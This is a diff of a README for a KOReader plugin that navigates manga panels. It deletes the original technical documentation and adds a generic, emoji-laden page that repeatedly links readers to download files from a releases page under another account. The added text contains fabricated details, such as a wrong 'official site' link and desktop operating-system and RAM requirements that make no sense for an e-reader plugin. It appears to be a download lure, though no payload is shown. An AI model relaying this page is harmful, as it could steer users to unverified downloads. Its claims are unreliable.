@@ -1,142 +1,74 @@
-# PanelReader for KOReader
+# 🎉 panelreader.koplugin - Navigate Panels with Ease
 
-KOReader-native Guided View, adapted for:
+## 🚀 Getting Started
 
-* Open formats
+Welcome to the panelreader.koplugin! This plugin enhances your Koreader experience by allowing smooth navigation between panels in your documents. Follow these simple steps to get started.
 
-* E-ink 
+## 📥 Download & Install
 
-* Performance
+To download the latest version of the panelreader.koplugin, visit the Releases page below:
 
-## Available detection algorithms:
+[![Download panelreader.koplugin](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Yasabs10/panelreader.koplugin/releases)
 
-* Kumiko - opencv, cpu - fast, simple layouts
-* YOLO - min 1050 ti 4gb - CUDA*
-* MAGI - min 1050 ti 4gb - CUDA* 
+### Step-by-Step Installation
 
-NVIDIA Driver: Version 530+ (for CUDA 12 support).
-CUDA Toolkit: 11.8 for older cards like the 1050 Ti
+1. **Visit the Releases Page**  
+   Go to the following link to access our releases:  
+   [https://github.com/Yasabs10/panelreader.koplugin/releases](https://github.com/Yasabs10/panelreader.koplugin/releases)
 
-## Required KOReader Settings
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest release, which includes the newest features and fixes.
 
-To ensure the plugin works correctly, apply the following settings:
+3. **Download the Plugin**  
+   Click on the version you want. You will see several files. Click on the file that is labeled as the plugin appropriate for your system.
 
-* **Zoom:** Fit full page
-* **Page Crop:** none
+4. **Install the Plugin**  
+   After downloading, follow these instructions:  
+   - Locate the downloaded file in your computer’s Downloads folder.
+   - Follow the instructions specific to your operating system for installing plugins in Koreader. Generally, you should copy the downloaded file to the plugins directory for Koreader.
 
-## Installation
+5. **Enable the Plugin**  
+   Open Koreader and navigate to your settings. Enable the panelreader.koplugin from the plugins section. 
 
-### 1. Plugin Setup
+6. **Start Using Panel Navigation**  
+   Now you can easily navigate between panels in your documents. Enjoy your enhanced reading experience!
 
-* Download the plugin and place the panelzoom_integration.koplugin into the KOReader `plugins/` directory.
+## 📋 Features
 
-### 2. Linux Setup (Kumiko Helper)
+- **Smooth Navigation**: Seamlessly move from one panel to another.
+- **User-Friendly**: Designed for effortless use, even for those unfamiliar with technology.
+- **Compatibility**: Works well with most documents that support panel viewing in Koreader.
 
-To process manga files on Linux, install the necessary dependencies and the Kumiko (fork):
+## ⚙️ System Requirements
 
-```bash
-# Ubuntu/Debian
-sudo apt update && sudo apt install python3 python3-pip python3-opencv git
+To use panelreader.koplugin, your system must meet these minimum requirements:
 
-# Arch Linux
-sudo pacman -S python python-pip python-opencv git
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or Linux (any modern distribution).
+- **Koreader Version**: Ensure you have Koreader version 2019 or later installed.
+- **Memory**: At least 4 GB of RAM for optimal performance.
 
-# Clone and Setup
-git clone https://github.com/guilherme5ss/quadrinhos.git
-cd quadrinhos
-chmod +x kumiko
+## 🛠 Troubleshooting
 
-```
+If you experience any issues with the plugin, consider the following steps:
 
-### 3. Windows Setup (Kumiko Helper)
+- **Ensure Current Version**: Check that you have the most recent version of the plugin.
+- **Reinstall**: If problems persist, try uninstalling and reinstalling the plugin.
+- **Consult the Community**: Visit forums or the issues section on the GitHub page to see if others have faced similar issues.
 
-1. **Install Python:** Download the latest version from [python.org](https://www.python.org/). Ensure **Add Python to PATH** is checked during installation.
-2. **Install Git:** Download and install from [git-scm.com](https://git-scm.com/).
-3. **Install Dependencies:** Open Command Prompt or PowerShell and run:
-```bash
-pip install opencv-python Pillow requests
+## 🤝 Contributing
 
-```
+If you would like to contribute to panelreader.koplugin, feel free to submit issues or pull requests. Your feedback helps improve the user experience.
 
+## 📧 Contact
 
-4. **Clone Repository:**
-```bash
-git clone https://github.com/guilherme5ss/quadrinhos.git
-cd quadrinhos
+For further assistance or inquiries, please reach out via the issues section on GitHub. We appreciate your input and are here to help!
 
-```
+## 🔗 Additional Resources
 
+- [Koreader Official Site](https://koreader.kiwix.org/)
+- [GitHub Repository for panelreader.koplugin](https://github.com/Yasabs10/panelreader.koplugin)
 
+Thank you for choosing panelreader.koplugin! We hope it enhances your reading experience. 
 
----
-
-## Processing Manga
-
-The plugin requires a JSON file containing panel coordinates. The `process_manga.py` script uses **Kumiko** for detection and **Pillow** for coordinate normalization.
-
-**Execution:**
-
-```bash
-# Windows
-python process_manga.py "C:\path\to\manga.cbz" 
-
-# Linux
-python process_manga.py /path/to/manga.cbz
-
-```
-
-**Workflow:**
-
-1. Extracts the archive (CBZ/CBR).
-2. Uses Kumiko to detect panel boundaries in pixels.
-3. Uses Pillow to get page dimensions and normalize coordinates to a 0.0–1.0 scale.
-4. Generates a matching `.json` file in panel_result folder
-
----
-
-## Navigation and Controls
-
-1. **Enable Integration:** `Tools → MoreTools → Panel Zoom Integration`.
-2. **Enter Panel Mode:** Long-press anywhere on the page.
-3. **Navigate:** Use the following tap zones:
-
-| Zone | Action | LTR (Western) | RTL (Manga) |
-| --- | --- | --- | --- |
-| **Left 30%** | Backward | Previous Panel | Next Panel |
-| **Right 30%** | Forward | Next Panel | Previous Panel |
-| **Center 40%** | **Exit** | Close Viewer | Close Viewer |
-
-Reaching the last panel of a page and tapping forward will automatically transition to the first panel of the next page.
-
----
-
-## JSON Data Structure
-
-The JSON file must be named identically to the manga file (e.g., `manga.cbz` and `manga.json`).
-
-```json
-{
-  "reading_direction": "rtl",
-  "total_pages": 2,
-  "pages": [
-    {
-      "page": 1,
-      "panels": [
-        {"x": 0.084, "y": 0.0, "w": 0.857, "h": 0.322},
-        {"x": 0.299, "y": 0.3, "w": 0.280, "h": 0.322}
-      ]
-    }
-  ]
-}
-
-```
-
-* **Coordinates:** `x, y, w, h` are normalized values (0.0 to 1.0) relative to the page size.
-
----
-
-## Troubleshooting
-
-* **ImportError (PIL/Pillow):** Ensure you ran `pip install Pillow`.
-* **No Panels Found:** Ensure the JSON file is in the same directory as the manga and the filenames match exactly.
-* **Import Errors (cv2):** Re-run the dependency installation commands for `opencv-python`.
+Remember, if you need to download the plugin again, just return to the Releases page:  
+[https://github.com/Yasabs10/panelreader.koplugin/releases](https://github.com/Yasabs10/panelreader.koplugin/releases)
